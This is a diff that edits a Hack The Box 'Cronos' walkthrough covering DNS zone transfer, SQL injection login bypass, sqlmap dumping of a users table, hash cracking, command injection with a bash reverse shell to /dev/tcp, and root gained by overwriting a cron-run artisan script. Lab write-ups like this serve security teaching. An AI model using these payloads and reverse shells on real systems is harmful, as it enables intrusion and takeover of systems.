@@ -58,7 +58,8 @@ Address: 10.10.10.13#53
 13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
 ```
 
-The first commands sets the server to Cronos, and then the second command looks for the IP address of the server.
+>   The first commands sets the server to Cronos, and then the second command looks for the IP address of the server.
+>
 
 Given that there is a DNS server, we should test for DNS zone transfers.
 
@@ -81,15 +82,10 @@ admin.cronos.htb.	604800	IN	A	10.10.10.13
 ns1.cronos.htb.		604800	IN	A	10.10.10.13
 www.cronos.htb.		604800	IN	A	10.10.10.13
 cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
-;; Query time: 4 msec
-;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
-;; WHEN: Fri Apr 22 14:10:44 +08 2022
-;; XFR size: 7 records (messages 1, bytes 203)
+...
 ```
 
-Oh? It seems like there is an interesting `admin.cronos.htb` subdomain.
-
-Alternatively, we can bruteforce the subdomains using `gobuster`!
+There is an interesting `admin.cronos.htb` subdomain. We can also brute-force the subdomains using `gobuster`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
@@ -100,29 +96,13 @@ Found: admin.cronos.htb
 ...
 ```
 
-Let’s add all these domains and subdomain into our `/etc/hosts` file.
-
-```bash
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
-└─# cat /etc/hosts     
-127.0.0.1	localhost
-127.0.1.1	shiro.shiro	shiro
-10.10.10.48     mirai.htb
-10.10.10.13     cronos.htb ns1.cronos.htb admin.cronos.htb
-
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-```
-
-Now, let’s take a look at their website.
+Add all these domains and subdomain into our `/etc/hosts` file and we should be able to access their website.
 
 ![default_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Cronos/default_webpage.png?raw=true)
 
 ![webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Cronos/webpage.png?raw=true)
 
-All the links in the webpage leads to something Lavarel related. Therefore, we should run a `gobuster` to check for hidden directories.
+All the links in the webpage leads to nothing useful. Checked for hidden directories with `gobuster`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
@@ -134,13 +114,13 @@ All the links in the webpage leads to something Lavarel related. Therefore, we s
 ...
 ```
 
-It seems like nothing interesting was returned. Let’s move on to the `admin.cronos.htb` webpage instead.
+It seems like nothing interesting was returned too. 
+
+Let’s move on to the `admin.cronos.htb` webpage instead.
 
 ![admin_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Cronos/admin_webpage.png?raw=true)
 
-Trying `admin:admin` doesn’t work. Instead, I tried using some generic SQL injection payloads listed [here](https://github.com/payloadbox/sql-injection-payload-list).
-
-The payload that worked was this `' OR 1 -- -`. This probably indicates that the server is using MySQL.
+Brute-forcing for default credentials didn’t work. Tested for generic SQL injection payloads referencing to this [link](https://github.com/payloadbox/sql-injection-payload-list). The payload that worked was this `' OR 1 -- -`. This probably indicates that the server is using MySQL.
 
 ##### Alternative Method
 
@@ -151,16 +131,7 @@ Another way we could automate this process is to use `sqlmap`. To do so, we have
 └─# cat login_request.txt
 POST / HTTP/1.1
 Host: admin.cronos.htb
-Content-Length: 29
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://admin.cronos.htb
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://admin.cronos.htb/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+...
 Cookie: PHPSESSID=6e7ohtcagfddqgcaab5qor2ir5
 Connection: close
 
@@ -168,7 +139,6 @@ username=admin&password=admin
 
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
 └─# sqlmap -r login_request.txt --dbs --batch                          
-
 ...
 [14:39:34] [INFO] parsing HTTP request from 'login_request.txt'
 [14:39:34] [INFO] resuming back-end DBMS 'mysql' 
@@ -198,13 +168,7 @@ available databases [2]:
 [*] admin
 [*] information_schema
 ...
-```
 
-Now we know that there are 2 databases - `admin` and `information_schema`.
-
-Let’s take a look at the tables inside the database `admin`!
-
-```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
 └─# sqlmap -r login_request.txt -D admin --tables --batch
 ...
@@ -216,11 +180,7 @@ Database: admin
 | users |
 +-------+
 ...
-```
 
-Yay, we found a table `users`! Let’s dump all the data.
-
-```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
 └─# sqlmap -r login_request.txt -D admin -T users --dump --batch
 ...
@@ -236,15 +196,11 @@ Table: users
 ...
 ```
 
-Nice, we found the password hash for admin.
-
-[Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) found the hash to be either MD5 or MD4.
-
-Using [MD5Online](https://www.md5online.org/md5-decrypt.html), we found the plaintext to the hash which is `1327663704`.
+Nice, we found the password hash for admin. [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) found the hash to be either MD5 or MD4. Cracked the hash using [MD5Online](https://www.md5online.org/md5-decrypt.html): `1327663704`.
 
 # Exploit
 
-After bypassing the login page, we are brought to this webpage.
+After bypassing the login page, we are brought to this page.
 
 ![welcome_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Cronos/welcome_page.png?raw=true)
 
@@ -252,7 +208,7 @@ As we are given a user input box, we should test for command injection.
 
 ![command_injection](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Cronos/command_injection.png?raw=true)
 
-Great, it seems like we can issue some malicious commands. Let’s start a netcat listener and inject a bash reverse shell command `bash -c 'exec bash -i &>/dev/tcp/10.10.14.9/1234 <&1'`
+Great, it seems like we can issue some malicious commands. Let’s start a listener and inject a bash reverse shell command `bash -c 'exec bash -i &>/dev/tcp/10.10.14.9/1234 <&1'`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
@@ -268,8 +224,6 @@ www-data
 # Privilege Escalation
 
 To check for any vulnerabilities, we can use the [LinEnum](https://github.com/rebootuser/LinEnum) script. 
-
-First, we download the script on our local machine, then we host it on our own server using `python3 -m http.server 80`.
 
 ```bash
 www-data@cronos:/var/www/admin$ wget http://10.10.14.9/LinEnum.sh
@@ -296,7 +250,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ...
 ```
 
-There is an interesting `artisan` script that is running. Let’s check out who owns the script!
+There is an interesting `artisan` script that is running. Let’s check out who owns the script.
 
 ```bash
 www-data@cronos:/var/www/admin$ ls -la /var/www/laravel/ 
@@ -313,35 +267,22 @@ drwxr-xr-x  6 www-data www-data    4096 Apr  9  2017 app
 ...
 ```
 
-Nice! The script is owned by `www-data` which means we can abuse this.
-
-We can now change the `artisan` script to a malicious reverse shell script. OwO
-
-To do this, we can create the malicious reverse shell script on our local machine and then transfer it over to the exploited machine.
+The script is owned by `www-data` which means we can abuse this. We can change the `artisan` script to a malicious reverse shell script.
 
 ```bash
 www-data@cronos:/var/www/laravel$ wget http://10.10.14.9/revshell.php
 www-data@cronos:/var/www/laravel$ cp revshell.php artisan
-
-- Another netcat listner -
-
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
-└─# nc -nlvp 9999
-listening on [any] 9999 ...
-connect to [10.10.14.9] from (UNKNOWN) [10.10.10.13] 51508
-Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- 10:22:01 up  1:25,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=0(root) gid=0(root) groups=0(root)
-/bin/sh: 0: can't access tty; job control turned off
-# whoami
-root
-# ls /home
-noulis
-# cat /home/noulis/user.txt
-51d236438b333970dbba7dc3089be33b
-# cat /root/root.txt
-1703b8a3c9a8dde879942c79d02fd3a0
 ```
 
-  
+  ```bash
+  ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Cronos]
+  └─# nc -nlvp 9999
+  ...
+  # whoami
+  root
+  # cat /home/noulis/user.txt
+  51d236438b333970dbba7dc3089be33b
+  # cat /root/root.txt
+  1703b8a3c9a8dde879942c79d02fd3a0
+  ```
+
